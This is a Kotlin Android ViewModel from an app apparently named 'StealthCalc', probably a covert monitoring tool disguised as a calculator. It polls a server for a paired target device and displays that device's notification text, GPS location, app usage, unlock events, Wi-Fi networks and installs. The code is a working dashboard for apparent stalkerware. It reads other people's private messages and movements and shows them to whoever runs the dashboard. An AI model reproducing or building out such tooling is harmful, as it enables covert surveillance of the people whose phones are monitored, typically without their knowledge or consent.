package com.stealthcalc.monitoring.ui

import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.stealthcalc.monitoring.data.MonitoringRepository
import com.stealthcalc.monitoring.model.DeviceState
import com.stealthcalc.monitoring.model.EventPayload
import com.stealthcalc.monitoring.network.AgentApiClient
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.json.jsonPrimitive
import javax.inject.Inject

enum class DashboardTab(val label: String, val kind: String?) {
    ALL("All", null),
    APPS("Apps", "APP_USAGE"),
    NOTIFICATIONS("Notifs", "NOTIFICATION"),
    BATTERY("Battery", "BATTERY"),
    NETWORK("Network", "NETWORK"),
    SCREEN("Screen", "SCREEN_EVENT"),
    LOCATION("Location", "LOCATION"),
    INSTALLS("Installs", "APP_INSTALL"),
}

data class AppUsageEntry(
    val appName: String,
    val packageName: String,
    val foregroundCount: Int,
)

data class ParsedEvent(
    val raw: EventPayload,
    val title: String,
    val subtitle: String,
    val icon: String,
)

data class DashboardState(
    val isPaired: Boolean = false,
    val isLoading: Boolean = false,
    val error: String? = null,
    val deviceState: DeviceState? = null,
    val allEvents: List<EventPayload> = emptyList(),
    val parsedEvents: List<ParsedEvent> = emptyList(),
    val appUsage: List<AppUsageEntry> = emptyList(),
    val selectedTab: DashboardTab = DashboardTab.ALL,
    val lastRefresh: Long = 0L,
)

@HiltViewModel
class DashboardViewModel @Inject constructor(
    private val repository: MonitoringRepository,
    private val apiClient: AgentApiClient,
) : ViewModel() {

    private val json = Json { ignoreUnknownKeys = true }

    private val _state = MutableStateFlow(
        DashboardState(isPaired = repository.isPaired)
    )
    val state: StateFlow<DashboardState> = _state.asStateFlow()

    init {
        if (repository.isPaired) {
            startPolling()
        }
    }

    private fun startPolling() {
        viewModelScope.launch {
            while (isActive) {
                refresh()
                delay(30_000L)
            }
        }
    }

    fun selectTab(tab: DashboardTab) {
        _state.update { current ->
            current.copy(
                selectedTab = tab,
                parsedEvents = filterAndParse(current.allEvents, tab),
            )
        }
    }

    fun refresh() {
        viewModelScope.launch {
            _state.update { it.copy(isLoading = true, error = null) }
            val targetDeviceId = repository.deviceId
            if (targetDeviceId.isBlank()) {
                _state.update { it.copy(isLoading = false, error = "No paired device") }
                return@launch
            }
            val deviceState = apiClient.getDeviceState(targetDeviceId)
            val events = apiClient.getEvents(
                targetDeviceId,
                since = System.currentTimeMillis() - 24 * 3600 * 1000L
            )
            val tab = _state.value.selectedTab
            if (deviceState != null) {
                _state.update {
                    it.copy(
                        isLoading = false,
                        deviceState = deviceState,
                        allEvents = events,
                        parsedEvents = filterAndParse(events, tab),
                        appUsage = computeAppUsage(events),
                        lastRefresh = System.currentTimeMillis(),
                    )
                }
            } else {
                _state.update {
                    it.copy(
                        isLoading = false,
                        error = "Could not reach server",
                        allEvents = events,
                        parsedEvents = filterAndParse(events, tab),
                        appUsage = computeAppUsage(events),
                    )
                }
            }
        }
    }

    private fun filterAndParse(events: List<EventPayload>, tab: DashboardTab): List<ParsedEvent> {
        val filtered = if (tab.kind != null) events.filter { it.kind == tab.kind } else events
        return filtered.take(100).map { parseEvent(it) }
    }

    private fun parseEvent(event: EventPayload): ParsedEvent {
        val obj = runCatching { json.parseToJsonElement(event.payload).jsonObject }.getOrNull()

        return when (event.kind) {
            "APP_USAGE" -> {
                val app = obj?.get("appName")?.jsonPrimitive?.content
                    ?: obj?.get("packageName")?.jsonPrimitive?.content ?: "Unknown"
                val action = obj?.get("event")?.jsonPrimitive?.content ?: ""
                val verb = if (action == "FOREGROUND") "Opened" else "Closed"
                ParsedEvent(event, "$verb $app", "", "app")
            }
            "NOTIFICATION" -> {
                val app = obj?.get("appName")?.jsonPrimitive?.content ?: obj?.get("packageName")?.jsonPrimitive?.content ?: ""
                val title = obj?.get("title")?.jsonPrimitive?.content ?: ""
                val text = obj?.get("text")?.jsonPrimitive?.content ?: ""
                ParsedEvent(event, "$app: $title", text, "notification")
            }
            "BATTERY" -> {
                val level = obj?.get("level")?.jsonPrimitive?.content ?: "?"
                val charging = obj?.get("isCharging")?.jsonPrimitive?.content == "true"
                val temp = obj?.get("temperature")?.jsonPrimitive?.content?.toIntOrNull()
                val tempStr = if (temp != null) " / ${temp / 10.0}\u00B0C" else ""
                ParsedEvent(event, "Battery $level%${if (charging) " charging" else ""}$tempStr", "", "battery")
            }
            "NETWORK" -> {
                val ssid = obj?.get("ssid")?.jsonPrimitive?.content
                val connected = obj?.get("connected")?.jsonPrimitive?.content == "true"
                val type = obj?.get("type")?.jsonPrimitive?.content ?: ""
                val status = if (connected) "Connected" else "Disconnected"
                val detail = if (ssid != null) "$type: $ssid" else type
                ParsedEvent(event, "$status — $detail", "", "network")
            }
            "SCREEN_EVENT" -> {
                val action = obj?.get("event")?.jsonPrimitive?.content ?: ""
                val label = when (action) {
                    "SCREEN_ON" -> "Screen turned on"
                    "SCREEN_OFF" -> "Screen turned off"
                    "USER_PRESENT" -> "Device unlocked"
                    else -> action
                }
                ParsedEvent(event, label, "", "screen")
            }
            "APP_INSTALL" -> {
                val app = obj?.get("appName")?.jsonPrimitive?.content
                    ?: obj?.get("packageName")?.jsonPrimitive?.content ?: "Unknown"
                val action = obj?.get("action")?.jsonPrimitive?.content ?: ""
                ParsedEvent(event, "$app — ${action.lowercase()}", "", "install")
            }
            "LOCATION" -> {
                val lat = obj?.get("latitude")?.jsonPrimitive?.content ?: "?"
                val lon = obj?.get("longitude")?.jsonPrimitive?.content ?: "?"
                val acc = obj?.get("accuracy")?.jsonPrimitive?.content ?: "?"
                ParsedEvent(event, "Location: $lat, $lon", "Accuracy: ${acc}m", "location")
            }
            else -> ParsedEvent(event, event.kind, event.payload.take(80), "unknown")
        }
    }

    private fun computeAppUsage(events: List<EventPayload>): List<AppUsageEntry> {
        val counts = mutableMapOf<String, Pair<String, Int>>()
        events.filter { it.kind == "APP_USAGE" }.forEach { event ->
            val obj = runCatching { json.parseToJsonElement(event.payload).jsonObject }.getOrNull() ?: return@forEach
            val action = obj["event"]?.jsonPrimitive?.content ?: return@forEach
            if (action != "FOREGROUND") return@forEach
            val pkg = obj["packageName"]?.jsonPrimitive?.content ?: return@forEach
            val name = obj["appName"]?.jsonPrimitive?.content ?: pkg
            val (_, count) = counts.getOrDefault(pkg, name to 0)
            counts[pkg] = name to (count + 1)
        }
        return counts.entries
            .sortedByDescending { it.value.second }
            .take(10)
            .map { (pkg, pair) -> AppUsageEntry(pair.first, pkg, pair.second) }
    }
}
